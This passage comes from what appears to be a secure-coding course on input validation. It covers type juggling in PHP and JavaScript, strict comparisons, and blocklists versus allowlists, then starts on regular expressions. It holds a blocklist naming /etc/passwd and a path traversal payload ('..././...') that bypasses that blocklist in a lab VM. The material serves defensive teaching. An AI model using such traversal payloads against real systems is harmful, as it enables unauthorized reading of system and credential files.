<pre id="fence-code-42" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">nodejs</span>
Welcome to Node.js v12.22.9.
Type ".help" for more information.
&gt; <span class="code-block-ui">10+1</span>
<span class="code-block-p">11</span>
&gt; <span class="code-block-ui">"10"+1</span>
<span class="code-block-s">'101'</span>
</code></pre>
<blockquote>
<p>Listing 15 - Examples of Javascript operations</p>
</blockquote>
<p>The first operation between two integers in Listing
15 yields the expected result. The next
operation contains a numeric string, which does not perform addition
but rather string concatenation. Let's try subtraction.</p>
<pre id="fence-code-43" class="fence-code has-commands"><code>&gt; <span class="code-block-ui">"10"-1</span>
<span class="code-block-p">9</span>
&gt; <span class="code-block-ui">.exit</span>
</code></pre>
<blockquote>
<p>Listing 16 - Implicit casting of a string value (Javascript)</p>
</blockquote>
<p>In the first operation, JavaScript implicitly cast the string to an
integer, producing the expected result. This is because weakly-typed
languages allow implicit conversions.</p>
<p>We can also explicitly cast the previous addition operation by using
<em>parseInt()</em>:</p>
<pre id="fence-code-44" class="fence-code has-commands"><code>&gt; <span class="code-block-ui">parseInt("10")+1</span>
<span class="code-block-s">11</span>
&gt; <span class="code-block-ui">.exit</span>
</code></pre>
<blockquote>
<p>Listing 17 - Explicit casting of a string value (Javascript)</p>
</blockquote>
<p>When explicitly cast, the operation performed addition on the integers.</p>
<p>When we use weakly-typed languages, we need to make sure we understand
the implicit casting (or <em>type coercion</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup>) that the
language offers to avoid unexpected results at runtime.</p>
<p>To demonstrate the unexpected behavior this can cause, we'll work
through a demonstration of <em>type juggling</em>, a form of type coercion in
PHP, another weakly-typed language. We'll begin with a demonstration
of type juggling using PHP version 5.6.</p>
<pre id="fence-code-45" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">php5.6 -a</span>
Interactive mode enabled

php &gt; <span class="code-block-ui">var_dump('0xff'== 255);</span>
<span class="code-block-p">bool(true)</span>
php &gt; <span class="code-block-ui">var_dump('0e1297452589' == 0);</span>
<span class="code-block-s">bool(true)</span>
php &gt; <span class="code-block-ui">exit</span>
</code></pre>
<blockquote>
<p>Listing 18 - Type juggling in comparisons - PHP 5.6</p>
</blockquote>
<p>For both commands in Listing 18, we used the
<em>var_dump()</em> function as a way to print the result of our
conditionals. The first command compares a hexadecimal string with its
decimal value and returns true because 0xff is 255 in decimal. The
second example uses <em>scientific notation</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> as a
string and compares it to a number.</p>
<p>Scientific notation consists of expressing a very large or a very
small number in a simplified way by writing it as a product of two
numbers. The first factor (mantissa) is a number usually in the
interval of (1 &lt;= mantissa &lt; 10), which is multiplied by a power of
ten. In our example, the mantissa is 0, so even though it is being
multiplied by a very large number, the result will still be zero. This
is why the condition evaluates to <em>true</em>.</p>
<p>The second example of type juggling we just tested is particularly
dangerous, and has been exploited (<em>CVE-2020-8088</em><sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> was
caused by this).</p>
<p>Let's analyze the same operations with a different version of PHP.
We'll use PHP 8.</p>
<pre id="fence-code-46" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">php -a</span>
Interactive mode enabled

php &gt; echo phpversion();
<span class="code-block-p">8.2.3</span>
php &gt; <span class="code-block-ui">var_dump('0xff'== 255);</span>
<span class="code-block-p">bool(false)</span>
php &gt; <span class="code-block-ui">var_dump('0e1297452589' == 0);</span>
<span class="code-block-s">bool(true)</span>
php &gt; <span class="code-block-ui">exit</span>
</code></pre>
<blockquote>
<p>Listing 19 - Type juggling in comparisons - PHP 8</p>
</blockquote>
<section class="sb-block"><p>The call to <em>phpversion();</em> is not necessary. It's just to emphasize that
we are running PHP 8.</p></section>
<p>Although the first behavior that compared a hex string to an integer
was changed in PHP 8, the second comparison remained the same.
However, there is a way to mitigate the issue. Let's explore how.</p>
<p>In PHP (and in JavaScript), there are two types of equality
comparisons: <em>loose and strict</em>.<sup class="footnote-ref"><a href="#fn9" id="fnref9">9</a></sup> The operators that
we need to use to make loose or strict comparisons are different, as
specified in the PHP documentation.<sup class="footnote-ref"><a href="#fn10" id="fnref10">10</a></sup></p>
<table>
<thead>
<tr>
<th>Operator name</th>
<th>Loose</th>
<th>Strict</th>
</tr>
</thead>
<tbody>
<tr>
<td>Equal</td>
<td>==</td>
<td>===</td>
</tr>
<tr>
<td>Not equal</td>
<td>!=</td>
<td>!==</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Table 1 - Loose and strict equality operators</p>
</blockquote>
<p>All of the comparisons we made in Listings 18 and
19 were loose comparisons. This means that they rely
on type juggling and only validate the equality <em>after</em> type juggling
has occurred.</p>
<p>Let's analyze an official table from PHP's documentation that explains
the results of loose comparisons in different scenarios.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/c945b8060b9d7ea1870cf8b9a424a861-iv_loose_comparisons.png" alt="Figure 3: PHP loose comparisons using " =="">
<figcaption>Figure 3: PHP loose comparisons using "=="</figcaption>
</figure>
<p></p>
<p>In our example, we compared a string that evaluated to 0 with an
integer 0. According to the table above, this should return TRUE,
which it did.</p>
<p>Now let's inspect the table for strict comparisons.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/461e0f6f15b515fa8982aacf2b41e225-iv_strict_comparisons.png" alt="Figure 4: PHP strict comparisons using " =="=&quot;&quot;">
<figcaption>Figure 4: PHP strict comparisons using "==="</figcaption>
</figure>
<p></p>
<p>The main characteristic of the strict comparisons table (with ===)
is that to get a TRUE result, values need to be equal and also have
the same type. This is why, in our case, a "0" string would not have
been strictly equal to a 0 integer. Let's try it out.</p>
<pre id="fence-code-47" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">php -a</span>
Interactive mode enabled

php &gt; <span class="code-block-ui">var_dump('0e1297452589' === 0);</span>
<span class="code-block-s">bool(false)</span>
php &gt; <span class="code-block-ui">exit</span>
</code></pre>
<blockquote>
<p>Listing 20 - Strict comparison in PHP 8</p>
</blockquote>
<p>In this case, the comparison returned false because the variable types
are not the same.</p>
<p>To prevent risks caused by type juggling, if we are not explicitly
casting our variables before comparing, our best defense is to compare
using strict comparison operators.</p>
<p>Another instance of coercion is when we use values of different types
as if they were booleans. When we do this, we rely on a particularity
called <em>truthy</em><sup class="footnote-ref"><a href="#fn11" id="fnref11">11</a></sup> and <em>falsy</em>.<sup class="footnote-ref"><a href="#fn12" id="fnref12">12</a></sup></p>
<p>Every language has different rules for truthy and falsy values. Just
to name a few examples, in JavaScript, the values 0, empty arrays, and
empty strings ("") are considered FALSE.</p>
<p>This can be a problem because if we compare truthy or falsy values
with loose comparisons, we might get unexpected results. Let's explore
some examples.</p>
<pre id="fence-code-48" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">nodejs</span>
Welcome to Node.js v12.22.9.
Type ".help" for more information.
&gt; <span class="code-block-ui">0==false</span>
<span class="code-block-p">true</span>
&gt; <span class="code-block-ui">0==[]</span>
true
&gt; <span class="code-block-ui">0==""</span>
true
</code></pre>
<blockquote>
<p>Listing 21 - Comparing falsy values with Javascript</p>
</blockquote>
<p>As presented in Listing 21, some results of the
values of the comparisons could be confusing and might cause bugs in
our code if we are not careful. This is why, in JavaScript, we also
need to use strict comparisons.</p>
<p>To summarize, we need to be careful when we perform calculations in
weakly-typed languages. We need to understand how unexpected outputs
will be processed. It's critical that we are aware of our language's
default behavior. For instance, while performing arithmetic operations
with a string in PHP, if it starts with a number, it will truncate
every non-numeric character before the conversion.</p>
<p>While performing validations, especially when we compare values
in weakly-typed languages, we need to understand the rules each
programming language applies before proceeding. When we compare, we
should prefer strict comparisons, otherwise, we might get unexpected
results when we compare truthy or falsy values, or when the language
performs coercion.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Sun Microsystems, 1995), <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html" target="_blank">https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/js/js_strict.asp" target="_blank">https://www.w3schools.com/js/js_strict.asp</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(Oracle, 2015), <a href="https://web.archive.org/web/20221212194033/https://docs.oracle.com/cd/E57471_01/bigData.100/extensions_bdd/src/cext_transform_typing.html" target="_blank">https://web.archive.org/web/20221212194033/https://docs.oracle.com/cd/E57471_01/bigData.100/extensions_bdd/src/cext_transform_typing.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(Artima, 2003), <a href="https://www.artima.com/weblogs/viewpost.jsp?thread=7590" target="_blank">https://www.artima.com/weblogs/viewpost.jsp?thread=7590</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(Microsoft, 2022), <a href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/types/casting-and-type-conversions" target="_blank">https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/types/casting-and-type-conversions</a> <a href="#fnref5" class="footnote-backref">↩︎</a> <a href="#fnref5:1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(Mozilla, 2023), <a href="https://developer.mozilla.org/en-US/docs/Glossary/Type_coercion" target="_blank">https://developer.mozilla.org/en-US/docs/Glossary/Type_coercion</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(Cool Conversion, 2023), <a href="https://www.georgebrown.ca/sites/default/files/uploadedfiles/tlc/_documents/Scientific_Notation.pdf" target="_blank">https://www.georgebrown.ca/sites/default/files/uploadedfiles/tlc/_documents/Scientific_Notation.pdf</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(NIST, 2020), <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8088" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2020-8088</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn9"><sup>9</sup><p>(PHP Group, 2023), <a href="https://www.php.net/manual/en/types.comparisons.php" target="_blank">https://www.php.net/manual/en/types.comparisons.php</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn10"><sup>10</sup><p>(PHP Group, 2023), <a href="https://www.php.net/manual/en/language.operators.comparison.php#language.operators.comparison" target="_blank">https://www.php.net/manual/en/language.operators.comparison.php#language.operators.comparison</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn11"><sup>11</sup><p>(Mozilla, 2023), <a href="https://developer.mozilla.org/en-US/docs/Glossary/Truthy" target="_blank">https://developer.mozilla.org/en-US/docs/Glossary/Truthy</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn12"><sup>12</sup><p>(Mozilla, 2023), <a href="https://developer.mozilla.org/en-US/docs/Glossary/Falsy" target="_blank">https://developer.mozilla.org/en-US/docs/Glossary/Falsy</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<!----><div><h2>Validating Input</h2>
<p>This Learning Unit covers the following Learning Objectives:</p>
<ul>
<li>Understand how to use blocklists and allowlists, as well as their advantages and disadvantages</li>
<li>Explore the syntax of Regular Expressions</li>
<li>Understand how to validate file uploads</li>
<li>Explore semantic validations</li>
</ul>
<p>Now that we better understand typing and its nuances, we can make
typing work in our favor when we are validating input. For instance,
in a static- and strongly-typed language such as Java, if we know that
the value we are expecting from our users is a numeric id, then we can
store it as an <em>int</em>, and by doing so, we immediately eliminate many
injection possibilities.</p>
<p>In contrast, when we are using weakly-typed languages, we need to
verify the typing of the data we are receiving so that we don't rely
on coercion when we perform operations with it. This can be achieved
with functions such as <em>is_numeric()</em>. However, even if we validate
the typing of our inputs, using strict comparisons should always be
our last line of defense.</p>
<p>Let's investigate more techniques we can use to place restrictions on
the data we receive so that users can't supply unexpected values.</p>
</div><!---->

<h2>Blocklists and Allowlists</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>When we have an idea of specific values that we want to disallow, we
can implement a <em>blocklist</em>.<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> Following this approach,
we can inspect user input to identify characters or strings that we
consider unacceptable.</p>
<p>A fundamental concern when using blocklists is that the list of
undesirable values typically needs to be extensive. If the blocklist
does not contain a value that could help an attacker bypass the
control we are trying to implement, the blocklist stops being useful.</p>
<section class="sb-block"><p>Some websites only allow specific characters for passwords.
However, injections in password fields should not be a concern for us
if we <em>hash</em><sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> them before use.</p></section>
<p>When we implement a blocklist, there are two common approaches we can
follow. We can reject the input and have the user submit a new one, or
we could try and sanitize it by replacing the values we don't consider
acceptable. Let's work through an example.</p>
<p>We need to make sure our ssh tunnel is still active, then we'll browse
to <strong>http://localhost:8080/?folder=/home/student/lists/examples</strong>:</p>
<pre id="fence-code-53" class="fence-code"><code>File: /home/student/lists/examples/blocklist.py
01: import sys
02: def main():
03:     available_files = ["public.txt", "public2.txt", "public3.txt"]
04:     print("Only available files: " + " ".join(available_files))
05:     file_name = input("Please enter the file you need to read &gt; ")
06:     <span class="code-block-p">file_name = file_name.replace("../", "")</span>
07:     <span class="code-block-p">file_name = file_name.replace("/etc/hosts", "")</span>
08:     <span class="code-block-p">file_name = file_name.replace("/etc/passwd", "")</span>
09:     try: 
10:         with open(file_name,"r") as a:  
11:                 print(a.read())
12:     except FileNotFoundError as e:
13:         print(f"The file {file_name} was not found")
14: 
15: if __name__=="__main__":
16:     main()
</code></pre>
<blockquote>
<p>Listing 22 - Blocklist Python code</p>
</blockquote>
<p>In this example, from lines 6-8, we are targeting the string "../",
which attackers can use to traverse directories on Unix systems (in
this case, to search for files above the current directory). It also
intends to block two particular files: <strong>/etc/hosts</strong> and
<strong>/etc/passwd</strong>. The code from lines 6-8 will delete those strings if
it finds them. Once the filename has been processed, the code will
print the contents of the file.</p>
<pre id="fence-code-54" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">cd /home/student/lists/examples/</span>
student@inputvalidation:~/lists/examples$ <span class="code-block-ui">python3 /home/student/lists/examples/blocklist.py</span>
Only available files: public.txt public2.txt public3.txt
Please enter the file you need to read &gt; <span class="code-block-ui">public.txt</span>
<span class="code-block-s">contents1</span>
</code></pre>
<blockquote>
<p>Listing 23 - Normal execution of a script with a blocklist</p>
</blockquote>
<p>In this case, the code ran and displayed the content of the file, just
as expected. Next, we'll try including the traversal string (../)
as part of the file name.</p>
<pre id="fence-code-55" class="fence-code has-commands"><code>student@inputvalidation:~/lists/examples$ <span class="code-block-ui">python3 /home/student/lists/examples/blocklist.py</span>
Only available files: public.txt public2.txt public3.txt
Please enter the file you need to read &gt; <span class="code-block-ui">../../../../etc/hostname</span>
<span class="code-block-p">The file etc/hostname was not found</span>
</code></pre>
<blockquote>
<p>Listing 24 - Malicious execution of a script with a blocklist</p>
</blockquote>
<p>Our example seems to work. When we tried to navigate to
<strong>/etc/hostname</strong>, the string containing the path was sanitized.</p>
<p>Next, we will try to bypass the blocklist. Instead of using the
traversal string, we will try to include other strings ("../"
and "..././").</p>
<pre id="fence-code-56" class="fence-code has-commands"><code>student@inputvalidation:~/lists/examples$ <span class="code-block-ui">python3 /home/student/lists/examples/blocklist.py</span>
Only available files: public.txt public2.txt public3.txt
Please enter the file you need to read &gt; <span class="code-block-ui">..././..././..././..././etc/hostname</span>
<span class="code-block-p">inputvalidation</span>
</code></pre>
<blockquote>
<p>Listing 25 - Bypassing a blocklist in Python</p>
</blockquote>
<p>After providing our input, we obtained the contents of
<strong>/etc/hostname</strong> in Listing 25. We can be
certain that the output is correct because the prompt of our command
line contains the hostname of our virtual machine after the "@"
character.</p>
<p>In Listing 25, the control was bypassed
by using sanitization as a way to help craft the malicious payload.
To be able to read <strong>/etc/hostname</strong>, an attacker would need to
get to the string "../" that was initially submitted on Listing
24.</p>
<p>Let's put ourselves in the position of the attacker. We need to use
the replacement in our favor. To get to the traversal string even
after sanitization, for every "../" required to navigate to the root
of the filesystem, we can craft a string that becomes "../" after
substitution.</p>
<p>For instance, let's start with the string  "a../aa". If we execute
the replacement of the validation, we'll get <em>aaa</em>. Now instead of
three instances of the letter a, let's split our target "../" into
two parts, "." and "./". After splitting the value, we can use a
decoy "../" that is meant to be deleted. We can place that decoy
string in the middle of our two parts, and our new string should be
"..././".</p>
<p>By using that new string as our traversal sequence, we can repeat
it many times, then simply append the rest of the path, which is
"etc/hostname". After the replacement takes place, the payload
in Listing 25 generates the string
"../../../../etc/hostname", which explains how we could retrieve the
contents of the file.</p>
<p>There are two considerations that we need to have in mind before
implementing a blocklist:</p>
<ul>
<li>
<p>We need to be thorough with the values that are part of our
blocklist. If an attacker finds an alias or a creative way to get to
that same result, then our blocklist will be bypassed. Even in our
example, we used <strong>/etc/hosts</strong> and not <strong>/etc/hostname</strong> as part of
our blocklist, even though both were meant to be private.</p>
</li>
<li>
<p>Cleaning input by removing values inside a blocklist is a
good approach, but can also create some paths for attackers
to inject malicious values, as we explored in Listing 25.
If the situation allows it, it is preferable to reject invalid input.</p>
</li>
</ul>
<p>To summarize, the implemented sanitization inadvertently converted the
string in Listing 25 into the string that
was initially rejected on Listing 24.</p>
<p>The main goal of our example was to restrict the user to particular
files in the same directory where the script is running. We could
follow a different approach to achieve this.</p>
<p>We can use <em>allowlists</em><sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> when we want to permit specific
values and reject everything else. In this case, the risk is minimized
because we know for certain which values will be acceptable. There is
no need to extensively think about values that an attacker might use.
If they are not part of our list, then we can be sure they won't be
accepted.</p>
<p>Let's analyze an example that would mitigate the issue we had with the
blocklist.</p>
<pre id="fence-code-57" class="fence-code"><code>File: /home/student/lists/examples/allowlist.py
01: import sys
02: def main():
03:     <span class="code-block-s">available_files = ["public.txt", "public2.txt", "public3.txt"]</span>
04:     print("Only available files: " + " ".join(available_files))
05:     file_name = input("Please enter the file you need to read &gt; ")
06:     <span class="code-block-p">if not file_name in available_files:</span>
07:         <span class="code-block-p">print("You are not allowed to access the selected file")</span>
08:         <span class="code-block-p">sys.exit(1)</span>
09:     try: 
10:         with open(file_name,"r") as a:  
11:                 print(a.read())
12:     except FileNotFoundError as e:
13:         print(f"The file {file_name} was not found")
14: 
15: if __name__=="__main__":
16:     main()
</code></pre>
<blockquote>
<p>Listing 26 - Allowlist Python code</p>
</blockquote>
<p>Lines 6-8 contain the implementation of our allowlist. In this case,
we need to highlight that only the files defined on line 3 will be
accessible. Since only specific values should be valid, any input that
does not meet our conditions is rejected. We did not try to sanitize
the input.</p>
<p>Let's execute the code with a normal payload and with a malicious
payload, then compare the results. We'll start with a normal
execution.</p>
<pre id="fence-code-58" class="fence-code has-commands"><code>student@inputvalidation:~/lists/examples$ <span class="code-block-ui">python3 /home/student/lists/examples/allowlist.py</span>
Only available files: public.txt public2.txt public3.txt
Please enter the file you need to read &gt; <span class="code-block-ui">public.txt</span>
<span class="code-block-s">contents1</span>
</code></pre>
<blockquote>
<p>Listing 27 -  Normal execution of a script with an allowlist</p>
</blockquote>
<p>The first execution of the script provided the contents of the file,
which is the expected result. Now let's try to bypass it to read a
file in a different directory.</p>
<pre id="fence-code-59" class="fence-code has-commands"><code>student@inputvalidation:~/lists/examples$ <span class="code-block-ui">python3 allowlist.py</span>
Only available files: public.txt public2.txt public3.txt
Please enter the file you need to read &gt; <span class="code-block-ui">../../../../etc/hostname</span>
<span class="code-block-p">You are not allowed to access the selected file</span>
</code></pre>
<blockquote>
<p>Listing 28 - Malicious execution of a script with an allowlist</p>
</blockquote>
<p>In this case, we can be certain that even if we try different
payloads, the condition that allows the user to read a file will only
be true if the input is one of the names that are declared on the
allowlist. This means that our control becomes more robust.</p>
<p>Blocklists and allowlists are not universal solutions. They only help
us restrict known values. However, sometimes our needs go beyond that,
especially when working not with values, but with formats or specific
structures that a value needs to have. We'll cover such use cases in
the following sections.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Trend Micro, 2023), <a href="https://www.trendmicro.com/vinfo/us/security/definition/blocklist" target="_blank">https://www.trendmicro.com/vinfo/us/security/definition/blocklist</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Kaspersky, 2023), <a href="https://encyclopedia.kaspersky.com/glossary/hashing/" target="_blank">https://encyclopedia.kaspersky.com/glossary/hashing/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(Trend Micro, 2023), <a href="https://www.trendmicro.com/vinfo/us/security/definition/safelist" target="_blank">https://www.trendmicro.com/vinfo/us/security/definition/safelist</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>Crafting Regular Expressions</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p><em>Regular Expressions (regex)</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> are another approach we
can follow when we want to validate input. Regular expressions are
character sequences that contain a format with a particular meaning
that allows a parser to verify if a string matches the format that the
regex encompasses. The main use cases for regular expressions include
searching for values, replacing values inside strings, and input
validation.</p>
<p>Many programming languages and tools (such as <em>grep</em>)<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup>
support different syntaxes and standards of regular expressions. The
IEEE POSIX standard<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> has three syntax variations: <em>Basic
Regular Expressions</em>, <em>Extended Regular Expressions</em>, and the
discontinued <em>Simple Regular Expressions</em>.</p>
<p>It is important to note, however, that <em>Perl's</em><sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup>
implementation of regular expressions has become the preferred
syntax, and is considered the de-facto standard. Eventually,
a re-implementation was created, which is referred to as <em>Perl
Compatible Regular Expressions</em> (PCRE)<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> and used in many
programming languages. This is the syntax that we are going to
explore.</p>
<p>There are a few concepts that we need to understand before we
continue:</p>
<ul>
<li>
<p><em>Meta characters</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> are characters that have a
particular meaning when used as part of a regex. This means that if
we want to evaluate them as a literal value, we need to
<em>escape</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> them with a backslash (<strong>\</strong>).</p>
</li>
<li>
<p><em>Groups</em> are sections of our regex enclosed in parentheses. Their
main function is to work as a sub-pattern inside a larger regular
expression. They are particularly useful when we want to specify
precedence. In cases where we have many groups, they are processed
from the inside out (hence the precedence). They are also useful
when we want to make logical decisions such as <em>not</em> and <em>or</em>.</p>
</li>
<li>
<p><em>Quantifiers</em> are auxiliary sequences that help us define if a group
or a character needs to be repeated and how many times.</p>
</li>
<li>
<p><em>Classes</em> enclose a group of characters that will be part of our
search. Any of the characters present in a class will be considered
a match if present in the fragment of the string we are searching
for. To define a class, we use square brackets (<strong>[]</strong>). As an example,
the class <em>[ae]</em> will match either a or e.</p>
</li>
<li>
<p><em>Lazy</em> means that the regular expression will stop searching when it
first finds an instance of a value that satisfies the search term.</p>
</li>
<li>
<p><em>Greedy</em> means that the regular expression will keep searching until
the last instance of the value that satisfies the search term.</p>
</li>
</ul>
<p>The following table contains common patterns that we can use to create
regular expressions.</p>
<table>
<thead>
<tr>
<th>Pattern</th>
<th>Classification</th>
<th>Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td>a b c 1 2 3</td>
<td>Character</td>
<td>Literal alphanumeric characters that are not meta characters, and are written as-is</td>
</tr>
<tr>
<td>.</td>
<td>Meta character</td>
<td>Match any single character except new line</td>
</tr>
<tr>
<td>^ $</td>
<td>Meta character</td>
<td>These characters are called anchors. They don't represent a value, but a position inside the string. They represent the beginning and the end of a line, respectively.</td>
</tr>
<tr>
<td>|</td>
<td>Meta character</td>
<td>It's the equivalent of a logical "or"</td>
</tr>
<tr>
<td>(x|y|z)</td>
<td>Group</td>
<td>Match either x, y, or z</td>
</tr>
<tr>
<td>[xyz]</td>
<td>Class</td>
<td>Match either x, y, or z</td>
</tr>
<tr>
<td>[^xyz]</td>
<td>Class</td>
<td>Match anything but x, y, or z</td>
</tr>
<tr>
<td>[b-g]</td>
<td>Class</td>
<td>Match any character in the range of b-g in the alphabet</td>
</tr>
<tr>
<td>\s</td>
<td>Class</td>
<td>Match a space, it's the equivalent of [ ]</td>
</tr>
<tr>
<td>\S</td>
<td>Class</td>
<td>Match any character that is not a space, it's the equivalent of   [^ ]</td>
</tr>
<tr>
<td>\d</td>
<td>Class</td>
<td>Match any digit, it's the equivalent of [0-9]</td>
</tr>
<tr>
<td>\D</td>
<td>Class</td>
<td>Match any character that is not a digit, it's the equivalent of [^0-9]</td>
</tr>
<tr>
<td>\w</td>
<td>Class</td>
<td>Match any alphanumeric character and underscores, it's the equivalent of [a-zA-Z0-9_]</td>
</tr>
<tr>
<td>\W</td>
<td>Class</td>
<td>Match any non-alphanumeric character and underscores, it's the equivalent of [^a-zA-Z0-9_]</td>
</tr>
<tr>
<td>*</td>
<td>Meta character / Quantifier</td>
<td>Match 0 or more of the preceding character</td>
</tr>
<tr>
<td>\+</td>
<td>Meta character / Quantifier</td>
<td>Match 1 or more of the preceding character</td>
</tr>
<tr>
<td>?</td>
<td>Meta character / Quantifier</td>
<td>Match 0 or 1 of the preceding character</td>
</tr>
<tr>
<td>{n}</td>
<td>Quantifier</td>
<td>Match the preceding character or group exactly n times</td>
</tr>
<tr>
<td>{n,}</td>
<td>Quantifier</td>
<td>Match the preceding character or group at least n times in a greedy fashion</td>
</tr>
<tr>
<td>{n,}?</td>
<td>Quantifier</td>
<td>Match the preceding character or group at least n times in a lazy fashion</td>
</tr>
<tr>
<td>{n,m}</td>
<td>Quantifier</td>
<td>Match the preceding character or group between n and m times in a greedy fashion</td>
</tr>
<tr>
<td>{n,m}?</td>
<td>Quantifier</td>
<td>Match the preceding character or group between n and m times in a lazy fashion</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Table 2 - Regular expression patterns</p>
</blockquote>
<p>Using Table 2 as a reference, let's create some
format validations. We should note that when working with regular
expressions, there are many ways to achieve the same result. As long
as we understand the patterns we are using, we might have different
regular expressions that work in the same way.</p>
<p>Let's start with a regular expression that does not require too many
patterns. We'll find the words "burger" and "sandwich", and if they
are found as part of a string, we will replace them with the word
"cake".</p>
<p>To follow along, let's start our VM in the <em>Resources</em> section.</p>
<p>To use regular expressions in Python, we need to import the
<em>re</em><sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> module.</p>
<pre id="fence-code-61" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; <span class="code-block-ui">import re</span>
</code></pre>
<blockquote>
<p>Listing 29 - Importing the Python regex library</p>
</blockquote>
<p>Next, we'll use the <em>re.sub()</em><sup class="footnote-ref"><a href="#fn9" id="fnref9">9</a></sup> function, which
accepts three parameters: a regular expression to use for the search,
the value that will replace the instances of the results of the
search, and the target string. In this case, we will use the regular
expression <em>burger|sandwich</em>, in which the | indicates that either
string is a valid match.</p>
<pre id="fence-code-62" class="fence-code has-commands"><code>&gt;&gt;&gt; <span class="code-block-ui">re.sub("burger|sandwich","cake","Cheeseburgers are more than just a sandwich, they are a wish fulfilled.")</span>
<span class="code-block-p">'Cheesecakes are more than just a cake, they are a wish fulfilled.'</span>
</code></pre>
<blockquote>
<p>Listing 30 - Python regex for string replacement</p>
</blockquote>
<p>The substitution took place and the function returned a new string.</p>
<p>Let's continue with another example. We'll define the conditions for a
phone number<sup class="footnote-ref"><a href="#fn10" id="fnref10">10</a></sup> format, and then create the regular
expression for it step by step.</p>
<p>We will describe a phone number format beginning with a country code
of "+593", but we want to capture both cell phones and landlines, which
differ in format.</p>
<ul>
<li>
<p>Cell phones have 12 digits after the <em>+</em> sign.</p>
</li>
<li>
<p>Landlines have 11 digits after the <em>+</em> sign.</p>
</li>
<li>
<p>Cell phones can only have 9 or 8 after the country code.</p>
</li>
<li>
<p>Landlines can't have 0, 9, or 8 after the country code.</p>
</li>
</ul>
<p>To create this regular expression, we'll use a
<em>divide-and-conquer</em><sup class="footnote-ref"><a href="#fn11" id="fnref11">11</a></sup> approach. Let's break the
problem into small chunks and then we'll assemble the final pattern.</p>
<p>The phone number always needs to start with <em>+593</em>. We'll begin with
<em>^\+593</em>, in which the meta character <em>^</em> signifies that the sequence
needs to be at the beginning of the string. The character <em>+</em> is a
meta character, which means we'll need to escape it with \, and
finally the number 593.</p>
<p>Both cell phones and landlines start with the same sequence, but the
pattern will diverge after the country code. For now, we will set up
numerical placeholder groups following the country code, separated by
a logical OR (|).</p>
<pre id="fence-code-63" class="fence-code"><code>^\+593(($)|($)) 
</code></pre>
<blockquote>
<p>Listing 31 - Partial regular expression</p>
</blockquote>
<p>Let's focus on cell phone formats first. The group that represents
cell phones could be something like <em>([98]\d{8}$)</em>. Let's break this
down. The first digit should be either 9 or 8, signified by <em>[98]</em>.
